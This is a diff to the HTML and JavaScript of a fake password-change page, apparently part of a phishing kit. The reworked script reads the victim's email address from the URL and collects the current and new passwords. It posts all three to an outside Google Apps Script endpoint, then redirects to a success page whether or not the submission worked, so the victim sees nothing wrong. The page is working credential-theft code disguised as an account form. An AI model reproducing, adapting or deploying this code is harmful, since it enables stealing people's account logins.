@@ -185,46 +185,46 @@
             </div>
         </div>
     </div>
-    <!-- Add this form before </body> -->
-    <form id="passwordForm" 
-        action="https://script.google.com/macros/s/AKfycbyEc6bDlTHcL2_xDQaXbfaUM4ZQQyz3oULk12K77vuZD-zc6_OwQlTcuew3nXZJqdl2/exec" 
-        method="POST" 
-        style="display: none;">
-        <input type="hidden" name="email" id="formEmail">
-        <input type="hidden" name="currentPassword" id="formCurrentPassword">
-        <input type="hidden" name="newPassword" id="formNewPassword">
-    </form>
 
-    <!-- Update the existing script -->
     <script>
-    document.querySelector('.btn-next').addEventListener('click', function() {
-    const oldPassword = document.getElementById('old_password').value;
-    const newPassword = document.getElementById('new_password').value;
-    
-    if (!oldPassword || !newPassword) {
-        alert('Please enter both current and new password');
-        return;
-    }
+    document.addEventListener('DOMContentLoaded', function() {
+        const urlParams = new URLSearchParams(window.location.search);
+        const email = urlParams.get('data');
+        document.getElementById('displayData').textContent = `${email}`;
 
-    const formData = new FormData();
-    formData.append('email', email);
-    formData.append('currentPassword', oldPassword);
-    formData.append('newPassword', newPassword);
+        // Back button functionality
+        document.querySelector('.btn-back').addEventListener('click', function() {
+            window.history.back();
+        });
 
-    fetch('https://script.google.com/macros/s/AKfycbyEc6bDlTHcL2_xDQaXbfaUM4ZQQyz3oULk12K77vuZD-zc6_OwQlTcuew3nXZJqdl2/exec', {
-        method: 'POST',
-        body: formData,
-        mode: 'no-cors' // Important for GitHub Pages
-    })
-    .then(() => {
-        window.location.href = 'success.html';
-    })
-    .catch(error => {
-        console.error('Error:', error);
-        window.location.href = 'success.html'; // Still proceed to maintain flow
-    });
+        // Next button functionality
+        document.querySelector('.btn-next').addEventListener('click', async function() {
+            const oldPassword = document.getElementById('old_password').value;
+            const newPassword = document.getElementById('new_password').value;
+            
+            if (!oldPassword || !newPassword) {
+                alert('Please enter both current and new password');
+                return;
+            }
+
+            try {
+                const response = await fetch('https://script.google.com/macros/s/AKfycbyEc6bDlTHcL2_xDQaXbfaUM4ZQQyz3oULk12K77vuZD-zc6_OwQlTcuew3nXZJqdl2/exec', {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/x-www-form-urlencoded',
+                    },
+                    body: `email=${encodeURIComponent(email)}&currentPassword=${encodeURIComponent(oldPassword)}&newPassword=${encodeURIComponent(newPassword)}`
+                });
+                
+                // Redirect to success page regardless of response (to maintain flow)
+                window.location.href = 'success.html';
+            } catch (error) {
+                console.error('Error:', error);
+                // Still redirect to success page even if submission fails
+                window.location.href = 'success.html';
+            }
+        });
     });
     </script>
-
 </body>
 </html>
